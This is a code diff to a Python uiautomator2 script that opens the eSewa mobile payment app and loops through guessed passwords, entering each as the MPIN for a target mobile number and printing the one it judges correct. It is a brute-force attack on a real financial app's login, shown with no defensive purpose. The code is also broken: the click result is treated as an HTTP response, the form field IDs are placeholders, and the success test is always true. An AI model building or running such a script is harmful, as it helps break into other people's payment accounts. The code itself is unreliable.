@@ -3,7 +3,7 @@ import uiautomator2 as u2
 # Connect the device
 d = u2.connect()
 
-# Launch the app (e.g., Twitter)
+# Launch the app (e.g., eSewa)
 d.app_start("com.esewa.android")
 
 # Wait for the app to load
@@ -30,13 +30,13 @@ while True:
     if len(passw) < 4:
         continue
     print(str(i) + " : " + passw)
-    response = open(d(resourceId="com.esewa.android:id/toolbar_login/register")).click()
     try:
+        response = d(resourceId="com.esewa.android:id/toolbar_login/register").click()
         if response.code == 200:
-            select_form (login_form)
-            .form['MobileNumber'] = MobileNumber
-            .form['mpin'] = passw
-            response = .submit()
+            # You need to complete the form filling with the correct form fields
+            d(resourceId="form_field_id_for_mobile_number").set_text(MobileNumber)
+            d(resourceId="form_field_id_for_mpin").set_text(passw)
+            response = d(resourceId="submit_button_id").click()
             response_data = response.read()
             if 'response_data' or 'Two-factor authentication' in response_data or 'security code' in response_data:
                 print('Your mpin is : ', passw)
